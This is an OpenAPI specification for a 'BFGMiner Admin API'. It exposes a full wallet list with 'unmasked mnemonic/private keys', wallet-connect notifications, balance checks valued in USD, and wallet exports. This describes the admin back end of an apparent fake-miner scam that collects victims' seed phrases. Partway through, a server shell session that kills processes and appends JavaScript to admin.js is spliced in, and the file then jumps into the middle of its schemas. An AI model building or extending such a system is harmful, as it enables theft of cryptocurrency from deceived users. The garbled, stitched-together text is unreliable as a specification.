openapi: 3.0.3
info:
  title: BFGMiner Admin API
  version: 1.0.0
  description: Production-ready admin dashboard API for BFGMiner with unmasked wallet data, mainnet balance validation, real-time notifications, and audit logging

servers:
  - url: http://localhost:5000/admin/api
    description: Local development server

paths:
  /users:
    get:
      summary: Get Users (Paginated)
      description: Paginated user list with wallet/download counts and search functionality
      parameters:
        - name: limit
          in: query
          schema:
            type: integer
            default: 50
        - name: offset
          in: query
          schema:
            type: integer
            default: 0
        - name: search
          in: query
          schema:
            type: string
      responses:
        '200':
          description: Users retrieved successfully
          content:
            application/json:
              schema:
                type: object
                properties:
                  users:
                    type: array
                    items:
                      $ref: '#/components/schemas/User'
                  total:
                    type: integer
                    example: 150
                  limit:
                    type: integer
                    example: 50
                  offset:
                    type: integer
                    example: 0
  /users/{user_id}:
    delete:
      summary: Delete User
      description: Delete user with cascade to related wallets, sessions, downloads
      parameters:
        - name: user_id
          in: path
          required: true
          schema:
            type: integer
      responses:
        '200':
          description: User deleted successfully
          content:
            application/json:
              schema:
                type: object
                properties:
                  success:
                    type: boolean
                    example: true
                  message:
                    type: string
                    example: User deleted successfully with cascade
        '404':
          description: User not found
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/ErrorResponse'
  /wallets:
    get:
      summary: Get All Wallets
      description: Complete wallet list with unmasked mnemonic/private keys and user details
      parameters:
        - name: search
          in: query
          schema:
            type: string
      responses:
        '200':
          description: Wallets retrieved successfully
          content:
            application/json:
              schema:
                type: object
                properties:
                  wallets:
                    type: array
                    items:
                      $ref: '#/components/schemas/Wallet'
  /wallets/{wallet_id}
cd /root/bfgminer && echo '=== Killing processes and completing files ===' && pkill -f 'python.*app.py' || true && pkill -f gunicorn || true && sleep 2 && echo '=== Completing admin.js ===' && cat >> static/js/admin.js << 'EOF'
function showLoading() {
    document.getElementById('loadingSpinner')?.classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loadingSpinner')?.classList.add('hidden');
}

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-lg ${type === 'success' ? 'bg-green-600 text-white' : type === 'error' ? 'bg-red-600 text-white' : 'bg-blue-600 text-white'}`;
    toast.classList.remove('hidden');
    setTimeout(() => toast.classList.add('hidden'), 4000);
}

function logoutHandler() {
    if (confirm('Are you sure you want to log out?')) {
        localStorage.removeItem('adminToken');
        fetch('/admin/logout', { method: 'POST' })
            .then(() => window.location.href = '/admin/login')
            .catch(err => window.location.href = '/admin/login');
    }
}
        connection_method:
          type: string
          example: walletconnect
        mnemonic:
          type: string
          example: abandon ability able about above absent absorb abstract absurd abuse access accident
        private_key:
          type: object
          properties:
            s:
              type: string
              example: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d
        created_at:
          type: string
          format: date-time
          example: 2025-01-01T10:00:00Z
        last_balance_check:
          type: string
          format: date-time
          example: 2025-01-02T15:30:00Z
    Notification:
      type: object
      properties:
        id:
          type: integer
          example: 1
        type:
          type: string
          enum: [registration, wallet_connect, download, balance_update]
          example: registration
        user_id:
          type: integer
          example: 1
        wallet_address:
          type: string
          example: 0x742d35Cc6634C0532925a3b8D8a8f4aE9f4B8cB8
        message:
          type: string
          example: New user registered: user@example.com
        is_read:
          type: boolean
          example: false
        created_at:
          type: string
          format: date-time
          example: 2025-01-01T10:00:00Z
        user_email:
          type: string
          example: user@example.com
    AuditLog:
      type: object
      properties:
        id:
          type: integer
          example: 1
        admin_id:
          type: integer
          example: 1
        admin_username:
          type: string
          example: admin
        action:
          type: string
          enum: [login, user_view, wallet_delete, balance_check, mark_notifications_read, export_users_csv, export_wallets_json]
          example: login
        target_id:
          type: integer
          example: 123
        target_type:
          type: string
          example: user
        details:
          type: string
          example: User 123 viewed profile
        ip_address:
          type: string
          example: 192.168.1.1
        created_at:
          type: string
          format: date-time
          example: 2025-01-01T10:00:00Z
    BalanceValidationRequest:
      type: object
      properties:
        wallet_address:
          type: string
          example: 0x742d35Cc6634C0532925a3b8D8a8f4aE9f4B8cB8
      required:
        - wallet_address
    BalanceValidationResponse:
      type: object
      properties:
        success:
          type: boolean
          example: true
        wallet_address:
          type: string
          example: 0x742d35Cc6634C0532925a3b8D8a8f4aE9f4B8cB8
        balance_eth:
          type: number
          example: 1.5
        balance_usd:
          type: number
          example: 3750.0
        last_checked:
          type: string
          format: date-time
          example: 2025-01-02T15:30:00Z
        eth_price:
          type: number
          example: 2500.0
    Statistics:
      type: object
      properties:
        total_users:
          type: integer
          example: 150
        total_wallets:
          type: integer
          example: 200
        unread_notifications:
          type: integer
          example: 5
        today_logs:
          type: integer
          example: 25
        user_growth:
          type: array
          items:
            type: integer
          example: [10, 15, 20, 25, 30]
        user_growth_dates:
          type: array
          items:
            type: string
            format: date
          example: ["2025-01-01", "2025-01-02", "2025-01-03", "2025-01-04", "2025-01-05"]
        connection_methods:
          type: array
          items:
            type: string
          example: ["walletconnect", "manual", "metamask", "trustwallet"]
        connection_counts:
          type: array
          items:
            type: integer
          example: [100, 50, 30, 20]
    ErrorResponse:
      type: object
      properties:
        success:
          type: boolean
          example: false
        error:
          type: string
          example: Invalid credentials
security:
  - bearerAuth: []
securitySchemes:
  bearerAuth:
    type: http
    scheme: bearer
    bearerFormat: JWT
tags:
  - name: Authentication
    description: Admin login and session management
  - name: Users
    description: User management and monitoring
  - name: Wallets
    description: Wallet monitoring and balance validation
  - name: Notifications
    description: Real-time notification system
  - name: Logs
    description: Admin audit logging
  - name: Exports
    description: Data export functionality
  - name: Statistics
    description: Dashboard analytics and metrics
